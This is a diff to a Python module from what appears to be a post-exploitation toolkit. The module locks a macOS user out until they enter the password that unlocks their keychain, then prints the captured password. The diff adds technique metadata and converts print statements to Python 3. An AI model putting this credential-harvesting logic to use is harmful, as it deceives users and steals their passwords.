@@ -16,6 +16,10 @@ class Module(object):
                             'This locks the user out until the password can unlock the user keychain. '
                             'This allows you to prevent Sudo/su failed logon attempts. (credentials till I get them!)'),
 
+            'Software': '',
+
+            'Techniques': ['T1113'],
+
             # True if the module needs to run in the background
             'Background' : False,
 
@@ -153,15 +157,15 @@ def run(exitCount, verbose=False):
                     correct = unlockchain(password)
                     if correct:
                         # we found the right password!
-                        print '[!] unlock-keychain passed: ' + str(password)
+                        print('[!] unlock-keychain passed: ' + str(password))
                         break
                     else:
-                        print "[*] Bad password: " + str(password)
+                        print("[*] Bad password: " + str(password))
                         text = retrypassword()
             else:
                 text = retrypassword()
     except Exception as e:
-        print e
+        print(e)
 
 exitCount = %s
 verbose = %s
